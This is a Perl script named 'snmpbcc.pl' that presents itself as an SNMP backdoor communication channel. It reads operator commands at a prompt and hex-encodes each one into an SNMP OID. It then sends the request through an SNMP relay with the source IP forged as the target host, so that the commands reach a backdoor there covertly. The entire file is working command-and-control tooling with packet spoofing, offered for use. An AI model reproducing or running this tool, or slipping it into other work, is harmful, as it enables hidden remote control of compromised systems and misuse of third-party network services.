#!/usr/bin/perl

use strict;
use warnings;
use Getopt::Std;
use Net::RawIP;

my $hex = '';
my $line='';


## Variables ##
my(%snmpbcc,%args);

$snmpbcc{name} = "snmpbcc.pl";
$snmpbcc{version} = '0.1 (beta)';
$snmpbcc{description} = 'SNMP Backdoor Communication Channel';
$snmpbcc{author} = 'Anestis Bechtsoudis';
$snmpbcc{email} = 'anestis@bechtsoudis.com';
$snmpbcc{website} = 'http(s)://bechtsoudis.com';
$snmpbcc{twitter} = '@anestisb';

# SNMP Message Field (reverse order from in to out)
$snmpbcc{value} ="0500";			# Value field set to null
$snmpbcc{oid} = "";			# Object Identifier
$snmpbcc{varbind} = "";			# Variable bind
$snmpbcc{varbind_list} = "";		# Variable bind list
$snmpbcc{error_index} = "020100";	# Error Index to zero
$snmpbcc{error} = "020100";		# No Error
$snmpbcc{r_id} = "";			# Request ID
$snmpbcc{pdu} = "";			# SNMP PDU
$snmpbcc{community} = "";		# Community String
$snmpbcc{snmpv} = '020101';		# Default SNMP version 2c
$snmpbcc{snmp_msg } = "";		# Overall SNMP message

# Character Representation
$snmpbcc{data} = "";

# Communaction fields
$snmpbcc{relay_ip} = "";
$snmpbcc{relay_port} = "";
$snmpbcc{target_ip} = "";
$snmpbcc{target_port} = "";

## Help Global Variables ##
my $command = "";
my $snmp_packet = '';
my @targs = ();


# Print SNMPbc logo
print_logo();

# Parse command args
getopts("c:t:r:h", \%args) or die "[-] Problem with the supplied arguments.\n";

# Print usage in -h case
print_usage() if $args{h};

# Check for other options
if(defined $ARGV[0]) { print "[-] Unknown option:$ARGV[0]\n"; exit; }

# Check for required options
if(!defined $args{c} or !defined $args{t} or !defined $args{r}) {
    print "[-] Missing arguments.\n";
    print "\nUse -h for help\n";
    exit;
}

# Parse target argument
@targs=split(':',$args{t});
if(@targs==2) { ($snmpbcc{target_ip}, $snmpbcc{target_port}) = @targs; }
else {
    print "[-] Invalid target argument.\n";
    print "\nUse -h for help\n";
    exit;
}

# Parse snmp relay argument
@targs=split(':',$args{r});
if(@targs==2) { ($snmpbcc{relay_ip}, $snmpbcc{relay_port}) = @targs; }
else {
    print "[-] Invalid relay argument.\n";
    print "\nUse -h for help\n";
    exit;
}

# Print quit help message
print "Type 'exit' to quit CLI.\n\n";

# Communication loop
while(1) {
    print 'snmp-bcc$ ';
    chop($command=<STDIN>);

    # Exit if "exit" is typed
    if($command eq "exit") { print "Bye...\n"; last; }

    cmd_send();
}

exit;

#################################################################################
# Backdoor cmd send
sub cmd_send
{

    my $h_command = '';

    # Calculate OID based on $command
    foreach my $c (unpack("C*", '#$#'.$command.'#$#')) {
        $h_command .= sprintf('%02x',$c);
    }
    # Prepend Type ID (0x06) and size (ASN.1 Format)
    $snmpbcc{oid} = "06".get_length($h_command).$h_command;

    # Define Variable bind field
    $snmpbcc{varbind} = "30".get_length($snmpbcc{oid}.$snmpbcc{value}).$snmpbcc{oid}.$snmpbcc{value};

    # Define Variable bind list field
    $snmpbcc{varbind_list} = "30".get_length($snmpbcc{varbind}).$snmpbcc{varbind};

    # Define Request ID field
    $snmpbcc{r_id} = get_request_id();
  
    # Define SNMP PDU
    $snmpbcc{pdu} = "a0".get_length($snmpbcc{r_id}.$snmpbcc{error}.$snmpbcc{error_index}.$snmpbcc{varbind_list}).
    		   $snmpbcc{r_id}.$snmpbcc{error}.$snmpbcc{error_index}.$snmpbcc{varbind_list};

    # Define Community String
    $snmpbcc{community} = get_community($args{c});

    # Define overall SNMP messsage
    $snmpbcc{snmp_msg} = "30".get_length($snmpbcc{snmpv}.$snmpbcc{community}.$snmpbcc{pdu}).
			$snmpbcc{snmpv}.$snmpbcc{community}.$snmpbcc{pdu};

    # Convert to character representation
    while($snmpbcc{snmp_msg} =~ /(.{2})/sg) {
        $snmpbcc{data} .= chr(hex($1));
    }

    $snmp_packet = new Net::RawIP(
				  { ip => {
                		      tos => 0, 
                		      saddr => $snmpbcc{target_ip}, 
                		      daddr => $snmpbcc{relay_ip}, 
                	              protocol => 17,
                	            }, 
        			    udp => {
                		      source => $snmpbcc{target_port}, 
                		      dest => $snmpbcc{relay_port},
                		      data => $snmpbcc{data},
                		    }
        	  		  }
    );
    $snmp_packet -> send();
    flush_packet();
}

#################################################################################
# Print logo
sub print_logo
{
    print "\n\tSNMP-BCC $snmpbcc{version} - $snmpbcc{description}\n";
    print "\tWritten by $snmpbcc{author}\n";
    print "\t{ $snmpbcc{twitter} | $snmpbcc{email} | $snmpbcc{website} }\n\n";
}

#################################################################################
# Print help page
sub print_usage
{
print qq(
Usage: snmpbcc.pl [options]

Options:
  -c	SNMP Community String

  -t	Target Host IP:Port

  -r	SNMP Relay Service IP:PORT

  -h	Display help message
);

exit;
}

#################################################################################
# Get length in bytes (hex format)
sub get_length
{
    return sprintf('%02x',length($_[0])/2)
}

#################################################################################
# Get Community at ASN.1 format
sub get_community
{
    my $c_str =$_[0];
    my $c_hex = '';
    my $line = '';

    my @ASCII = unpack("C*", $c_str);
    foreach $line (@ASCII) {
        $c_hex .= sprintf('%02x',$line);
    }
    return "04".get_length($c_hex).$c_hex;
}

#################################################################################
# Get random Request ID at ASN.1 format
sub get_request_id
{
    my $range = 100000000;
    my $minimum = 500000000;
    my $num = int(rand($range)) + $minimum;
    my $c_num = sprintf('%02x',$num);

    return "02".get_length($c_num).$c_num;
}

#################################################################################
# Flush packet data
sub flush_packet
{
    $snmpbcc{oid} = "";
    $snmpbcc{varbind} = "";
    $snmpbcc{varbind_list} = "";
    $snmpbcc{r_id} = "";
    $snmpbcc{pdu} = "";
    $snmpbcc{community} = "";
    $snmpbcc{snmp_msg } = "";
    $snmpbcc{data} = "";
}
